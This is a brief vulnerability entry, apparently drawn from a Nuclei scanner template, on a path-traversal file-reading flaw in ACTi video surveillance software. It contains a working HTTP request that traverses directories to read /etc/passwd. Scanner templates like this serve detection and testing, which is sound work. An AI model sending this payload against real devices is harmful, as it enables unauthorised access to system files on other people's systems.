# Vulnerability: ACTi-Video Monitoring - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`acti-video-lfi.yaml`)

## Description
ACTI video surveillance has loopholes in reading any files

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/images/../../../../../../../../etc/passwd
```

